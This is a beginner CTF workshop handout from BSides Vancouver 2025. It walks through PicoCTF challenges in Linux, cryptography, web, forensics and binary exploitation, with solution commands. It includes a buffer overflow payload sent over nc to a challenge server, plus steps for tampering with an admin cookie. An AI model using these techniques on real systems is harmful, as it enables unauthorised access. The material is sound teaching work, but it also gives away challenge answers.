# BSides Vancouver 2025 Workshop
#### Short Link
https://tinyurl.com/y4stu63n
## Title: CTF Crash Course with PicoCTF
#### PicoCTF Registration Link
`https://play.picoctf.org/register`
### Part 1: Navigating the Linux Terminal (10:30 AM)
* Downloading files
  * Pico - Obedient Cat https://play.picoctf.org/practice/challenge/147
    * key commands - `wget` `ls` `cat`
```
wget https://mercury.picoctf.net/static/a5683698ac318b47bd060cb786859f23/flag
ls
cat flag
```   
* Navigation, listing contents, reading files, tab auto-complete
  * Pico - Tab Tab Attack https://play.picoctf.org/practice/challenge/176
    * key commands `wget` `ls` `unzip` `cd` `cat` `./<file_name>`
```
wget https://mercury.picoctf.net/static/659efd595171e4c40378be6a2e9b7298/Addadshashanammu.zip
unzip Addadshashanammu.zip
cd Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku
./fang-of-haynekhtnamet
```
* Capstone Exercise
  * Pico - Magikarp Ground Mission https://play.picoctf.org/practice/challenge/189
    * key commands `ssh` `pwd` `cat` `ls` `cd`
```
ssh ctf-player@venus.picoctf.net -p <port_number>
ls
cat 1of3.flag.txt
cat instructions-to-2of3.txt
cd /
ls
cat instructions-to-3of3.txt
cd ~
ls
cat 3of3.flag.txt
```
### Part 3: Intro to Cryptography (11:15 AM)
* Base64 encoding
  * Repetitions https://play.picoctf.org/practice/challenge/371
    * key commands `wget` `base64`
```
wget https://artifacts.picoctf.net/c/473/enc_flag
ls
cat enc_flag
base64 -d enc_flag
base64 -d enc_flag | base64 -d
base64 -d enc_flag | base64 -d | base64 -d
base64 -d enc_flag | base64 -d | base64 -d | base64 -d
base64 -d enc_flag | base64 -d | base64 -d | base64 -d | base64 -d
base64 -d enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
```
* ROT13 Cipher
  * Pico 13 https://play.picoctf.org/practice/challenge/62
    * key commands `echo` `tr`
```
echo 'cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
* Caesar Cipher
  * Pico Rotation https://play.picoctf.org/practice/challenge/373
    * key commands `wget` `cat`
#### website for solve
`https://cryptii.com/pipes/caesar-cipher`
### Part 4: Beginner's Web App Security (12:45 PM)
* HTTP Source
  * Pico - Inspect HTML https://play.picoctf.org/practice/challenge/275
    * key steps `ctrl + u` to look at webpage source code
  * Pico - Local Authority https://play.picoctf.org/practice/challenge/278
    * key steps `ctrl + u` to look at webpage source code
    * click on login.php
    * click on secure.js
    * the valid login credentials are `admin` and `strongPassword098765`
* Robots.txt
  * Pico - Where are the Robots https://play.picoctf.org/practice/challenge/4
    * key steps: navigate to the `/robots.txt` endpoint on the website
* HTTP Cookies
  * Pico - Power Cookie https://play.picoctf.org/practice/challenge/288
    * key steps: click on the `continue as guest` button
    * access the cookies for the website by using the `web developer tools`
    * edit the `isAdmin` cookie, changing the value from `0` to `1`
    * refresh the web browser
  * Pico - Cookie Monster Secret Recipe https://play.picoctf.org/practice/challenge/469
    * key steps: attempt a login with any username and password
    * access the cookies for the website by using the `web developer tools`
    * copy the value of the `secret recipe` cookie
    * use the following terminal command to get the flag:
```
echo 'cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzk2RjU4REFCfQ%3D%3D' | base64 -d
```
### Part 5: Intro to Digital Forensics (1:30 PM)
* Picture File Forensics
  * Pico - Information https://play.picoctf.org/practice/challenge/186
    * key commands `wget` `exiftool` `base64`
```
wget https://mercury.picoctf.net/static/b4d62f6e431dc8e563309ea8c33a06b3/cat.jpg
ls
exiftool cat.jpg
echo 'cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9' | base64 -d
``` 
  * Pico - Glory of the Garden https://play.picoctf.org/practice/challenge/44
    * key commands `wget` `strings`
```
wget https://jupiter.challenges.picoctf.org/static/d0e1ffb10fc0017c6a82c57900f3ffe3/garden.jpg
strings garden.jpg
```
* Disk Image Forensics
  * Pico - SleuthKit Apprentice https://play.picoctf.org/practice/challenge/300
    * key commands: `wget` `mkdir` `gunzip` `fsstat` `fls` `icat`
```
mkdir /tmp/sa_your_user_name
cd /tmp/sa_your_user_name
wget https://artifacts.picoctf.net/c/137/disk.flag.img.gz
gunzip disk.flag.img.gz
mmls disk.flag.img
fsstat -o 360448 disk.flag.img
fls -f ext4 -o 360448 -r disk.flag.img
icat -f ext4 -o 360448 -r disk.flag.img 2371
```
### Part 6: Intro to Binary Hacking (2:15 PM)
* Program Logic Flaws
  * Pico RPS https://play.picoctf.org/practice/challenge/293
    * key commands: `wget` `nc` `nano`
```
wget https://artifacts.picoctf.net/c/147/game-redacted.c
nano game-redacted.c
nc saturn.picoctf.net <port_number>
```
We have to figure out how the program decided the computer loses the RPS game, and how the strstr function works in C language
* Buffer Overflow Vulnerabilities
  * Pico Clutter Overflow https://play.picoctf.org/practice/challenge/216
    * key commands: `wget` `nano` `echo` `perl`
```
wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c
wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall
nano chall.c
echo 'we got the flag!' > flag.txt
perl -e 'print "A" x 264 . "\xef\xbe\xad\xde\x0a"' | ./chall
perl -e 'print "A" x 264 . "\xef\xbe\xad\xde\x0a"' | nc mars.picoctf.net 31890
```
### Appendix: Further Learning Resources
* Linux OS Operations
  * Overthewire - Bandit CTF Game https://overthewire.org/wargames/bandit/
  * HackMyVM - Venus CTF Game https://hackmyvm.eu/venus/
* Python Programming
  * Python Essentials Course https://www.netacad.com/courses/python-essentials-1?courseLang=en-US
  * W3 Schools Python Course https://www.w3schools.com/python/default.asp
* Cryptography
  * CryptoHack Learning Platform https://cryptohack.org/
  * Cryptopals Challenges https://cryptopals.com/
* Web App Hacking
  * Overthewire Natas Web App CTF Game https://overthewire.org/wargames/natas/
  * Portswigger Web Security Academy https://portswigger.net/web-security
* Digital Forensics
  * Cyber Defenders https://cyberdefenders.org/
  * PicoCTF Forensics Challenges https://play.picoctf.org/practice?category=4&page=1
* Binary Hacking
  * Pwn College https://pwn.college/
  * PicoCTF Binary Hacking Challenges https://play.picoctf.org/practice?category=6&page=1
